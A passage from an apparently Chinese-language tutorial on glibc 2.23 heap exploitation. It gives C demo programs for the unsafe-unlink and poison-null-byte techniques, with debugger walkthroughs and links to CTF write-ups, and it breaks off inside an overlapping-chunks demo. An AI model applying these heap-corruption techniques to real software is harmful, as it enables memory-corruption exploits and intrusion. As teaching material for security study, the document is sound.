class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	<span class="built_in">assert</span>(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>当然，其实chunk0_ptr并不一定是一个全局指针。以下代码在glibc2.23依然起作用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x80</span>;</span><br><span class="line">	<span class="type">uint64_t</span>* ptr0 = (<span class="type">uint64_t</span>*)<span class="built_in">malloc</span>(malloc_size);</span><br><span class="line">	<span class="type">uint64_t</span>* ptr1 = (<span class="type">uint64_t</span>*)<span class="built_in">malloc</span>(malloc_size);</span><br><span class="line">	ptr0[<span class="number">2</span>] = (<span class="type">uint64_t</span>)&amp;ptr0 - <span class="number">3</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line">	ptr0[<span class="number">3</span>] = (<span class="type">uint64_t</span>)&amp;ptr0 - <span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"> </span><br><span class="line">	<span class="type">uint64_t</span>* ptr1_head = (<span class="type">uint64_t</span>)ptr1 - <span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line">	ptr1_head[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	ptr1_head[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">free</span>(ptr1);</span><br><span class="line">	<span class="type">char</span> victim[<span class="number">10</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	ptr0[<span class="number">3</span>]=(<span class="type">uint64_t</span>)victim;</span><br><span class="line">	ptr0[<span class="number">0</span>] = <span class="number">0x4141414141</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,victim);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04编译并使用第一个源码pwncli改写rpath。
</code></pre>
<p>   简单介绍一下unlink，<a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/" >CTF Wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>里有介绍，简单总结如下：</p>
<pre><code>1，首先找到要进行unlink的chunk(这里记为P)的前后堆块，
   FD = P-&gt;fd, BK = P-&gt;bk。
2，进行安全检查，glibc2.23的潦草判断条件如下
   FD-&gt;bk == P, BK-&gt;fd == P。
3，然后执行FD-&gt;bk=BK, BK-&gt;fd=FD。
4，当某个non-fast大小的chunk被释放时，就会根据PREV_INUSE位检查其前后堆块是否处于释放状态，如果是就会将前面或后面的堆块取出并与当前堆块合并。取出前面或后面的堆块P的过程就是unlink。
</code></pre>
<h3 id="调试-6"><a href="#调试-6" class="headerlink" title="调试"></a>调试</h3><p>首先申请两块smallbin_chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6ZP8PYCJCE35KDG.png"
                      alt="图片描述"
                ><br>为了绕过unlink检查，这里将全局的chunk0_ptr+0x10(chunk0_ptr[2])处的内容改为chunk0_ptr-0x18的地址，注意这里chunk0_ptr[2]指向的是全局变量的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XTHTCK8EQSMAX6B.png"
                      alt="图片描述"
                ><br>同样，接下来将chunk0_ptr[3]的内容改为chunk0_ptr-0x10的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2GFDGPT8AB5TCPM.png"
                      alt="图片描述"
                ><br>chunk0_ptr位置在bss节。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2QDW7TADTJ8F9YD.png"
                      alt="图片描述"
                ></p>
<p>此时chunk0的堆结构。可以看到chunk0_ptr指向chunk0_fd(0x603010)的位置。chunk0_fd_nextsize和chunk0_bk_nextsize已被修改为全局变量（bss节）处的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_T7ZZAKUECF646WZ.png"
                      alt="图片描述"
                ><br>用图来表示如下<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NXQ9YXPN542KB5K.png"
                      alt="图片描述"
                ></p>
<p>接下来cdqe指令将EAX寄存器中的DWORD(32 位值)符号扩展为RAX寄存器中的 QWORD(64 位值)。然后利用shl指令逻辑左移三位，再利用neg指令求补。最后也就是将chunk1_hdr的内容改为chunk1_ptr-2（chunk1_prev_size）的地址。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JG8ZQB8MH2YV68Q.png"
                      alt="图片描述"
                ></p>
<p>接下来将chunk1_hdr[0]改为0x80大小，也就是chunk1的prev_size位变为0x80。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JN69YNASY7MKFCK.png"
                      alt="图片描述"
                ></p>
<p>然后利用and指令（与运算有零则零）把chunk1_hdr+1也就是chunk1_size的PREV_INUSE位改为0。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_BGBDQAVWY7R26XR.png"
                      alt="图片描述"
                ></p>
<p>现在堆结构如图。因为chunk_prev_size&#x3D;0x80,所以P_chunk如下<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PZ9JU3KFW6NJN5P.png"
                      alt="图片描述"
                ></p>
<p>然后把chunk1给free()掉因为其PREV_INUSE为0，又是small bin大小，触发unlink，要将P这个fake chunk摘除。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VY24BDSZW5SQSWA.png"
                      alt="图片描述"
                ><br>那么此时FD&#x3D;P-&gt;FD和BK&#x3D;P-&gt;bk，FD-&gt;bk &#x3D;&#x3D; P, BK-&gt;fd &#x3D;&#x3D; P。可以能够看到成功绕过glibc2.23检查。注意，我画的时候是根据布局画的，堆由低向高地址增长（由高向低画），bss由低向高画的。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3KAA3VZEGWRQ2CF.png"
                      alt="图片描述"
                ></p>
<p>接下来执行 两步操作 FD-&gt;bk&#x3D;BK, BK-&gt;fd&#x3D;FD。FD和BK只相差0x8字节大小。第一步会把chunk0_ptr指向低0x10字节处（0x602068），第二步把chunk0_ptr指向低0x18字节处（0x602060），最终chunk0_ptr指向了0x602060处。chunk0_ptr &#x3D; 0x602060，我们向chunk0_ptr写入内容时就会从0x602060开始向高地址写，我们发现，写到高0x18时，写到了我们保存写入地址指针的地址，这个地址(chunk0_ptr的物理地址0x602078)存储的地址(0x602060)就是我们开始写的地址，也就是chunk0_ptr指向的地址。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3G6W8HPTPJYVXXM.png"
                      alt="图片描述"
                ><br>可以看到，<code>chunk0_ptr</code>指向的地址由<code>*chunk0_ptr-0x18</code>保存，修改<code>*chunk0_ptr-0x18</code>存储的地址(0x602060)，也就修改了写入的起始地址，也就是chunk0_ptr指向的地址，我们会从这个新地址重新开始写，也就达到了任意地址写的效果。这只是其中一种用法，建议看例题来加深理解。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4A4TPGFMMJSRUCR.png"
                      alt="图片描述"
                ><br>我们也可以通过从0x602060开始向高地址覆盖，覆盖到0x602078处时，修改这里保存的地址，然后下次写时就会从修改的这个新地址开始写入。</p>
<h1 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h1><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><ul>
<li><p>off-by-one<br><a class="link"   href="https://www.52pojie.cn/thread-1825637-1-1.html" >ASIS CTF 2016 : b00ks <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.52pojie.cn/thread-1828172-1-1.html" >Plaid CTF 2015 : PlaidDB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.52pojie.cn/thread-1828388-1-1.html" >SECCON CTF 2016 : tinypad <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.52pojie.cn/thread-1836790-1-1.html" >BCTF 2016 : bcloud <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>overlapping chunk<br><a class="link"   href="https://www.52pojie.cn/thread-1833414-1-1.html" >0CTF 2018 : babyheap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.52pojie.cn/thread-1833578-1-1.html" >hack.lu CTF 2015 : bookstore <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
<h2 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* c;</span><br><span class="line">	<span class="type">uint8_t</span>* b1;</span><br><span class="line">	<span class="type">uint8_t</span>* b2;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line">	<span class="type">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">		<span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line">		<span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="type">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* c_prev_size_ptr = ((<span class="type">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">		*((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="type">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line">		<span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line">		<span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="type">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line">		<span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(<span class="built_in">strstr</span>(b2, <span class="string">&quot;DDDDDDDDDDDD&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>使用<code>glibc2.23</code>加参数<code>-g</code>编译并修改<code>rpath</code>。</p>
<h3 id="调试-7"><a href="#调试-7" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_U7NK7EPN83MV5VH.png"
                      alt="图片描述"
                ><br>申请了四个堆块,a(0x111),b(0x211),c(0x111),barrier(0x111)。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DEP93F63ATZPHJZ.png"
                      alt="图片描述"
                ><br>因为我们要利用<code>off-by-null</code>把<code>chunkb</code>的<code>size</code>改为<code>0x200</code>，又因为是<code>chunkb</code>是<code>non-fast chunk</code>，将<code>b+0x1f0</code>的位置写为<code>0x200</code>绕过检查。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2Y8ADDBXUQXUG4R.png"
                      alt="图片描述"
                ><br>接下来<code>free(b)</code>后，假设<code>a</code>存在<code>off-by-null</code>漏洞，将<code>chunkb</code>改为了<code>0x200</code>大小。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_C8GR9YZ8AVVR6YS.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_DMWG5SBG4MM3W5S.png"
                      alt="图片描述"
                ><br>然后申请两个堆块<code>b1_real_size : 0x110</code>,<code>b2_real_size : 0x90</code>，然后<code>free(b1)</code>来绕过<code>unlink</code>检查，再<code>free(c)</code>后，会向上寻找<code>0x210</code>大小的堆块，发现<code>b1</code>是一个已经释放的<code>chunk</code>，便会合并，此时我们再去申请<code>real_size == 0x110+0x210</code>的堆块时，便控制了中间所有的<code>chunk</code>。</p>
<h2 id="overlapping-chunks-1"><a href="#overlapping-chunks-1" class="headerlink" title="overlapping_chunks_1"></a>overlapping_chunks_1</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis is a simple chunks overlapping problem\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s start to allocate 3 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span 